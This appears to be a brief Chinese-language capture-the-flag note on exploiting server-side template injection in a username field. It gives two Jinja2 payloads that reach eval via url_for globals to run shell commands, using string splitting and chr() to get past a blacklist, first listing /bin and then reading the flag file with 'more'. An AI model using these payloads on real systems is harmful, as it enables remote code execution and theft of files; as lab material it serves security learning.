![[Pasted image 20250118114936.png]]

用户名这里SSTI
黑名单东西不少，藏flag，删了cat这些，ls看还有个more能用

```python
{{ url_for.__globals__['__builtins__']['eval']('" ".join(__import__("os").popen("ls " + chr(47) + "bin").read().split(chr(10)))') }}

{{ url_for.__globals__['__builtins__']['eval']('" ".join(__import__("os").popen("mo" + "re " + chr(47) + "fla" + "gf149").read().split(chr(10)))') }}
```